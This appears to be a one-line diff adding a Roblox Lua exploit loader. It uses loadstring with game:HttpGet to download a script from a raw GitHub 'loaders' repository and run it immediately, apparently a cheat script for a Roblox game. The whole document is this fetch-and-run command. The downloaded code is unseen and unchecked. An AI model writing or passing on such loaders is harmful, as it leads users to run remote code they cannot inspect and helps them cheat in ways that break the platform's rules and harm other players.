@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/7-days-cat-sitting-spam0-09eai61liwoa2x.lua"))()
